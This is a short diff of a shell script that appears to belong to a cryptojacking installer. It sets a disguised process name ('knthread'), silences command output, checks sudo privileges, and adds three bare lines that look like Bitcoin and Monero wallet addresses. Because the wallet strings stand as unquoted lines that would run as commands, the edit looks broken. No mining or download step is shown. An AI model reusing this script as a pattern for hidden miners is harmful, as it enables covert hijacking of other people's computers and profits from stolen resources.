@@ -18,6 +18,9 @@ LBIN8="knthread"
 null=' >/dev/null 2>&1'
 sudoer=1
 sudo=''
+1BoatSLRHtKNngkdXEeobR76b53LETtpyT
+4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge
+44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb9
 if [ "$(whoami)" != "root" ]; then
     sudo="sudo "
     if [[ $EUID -eq 0 ]]; then sudoer=1; echo "sudo, yay"; else echo "not sudo aiii"; sudo=''; sudoer=0; grepmn=".${LBIN8}"; fi
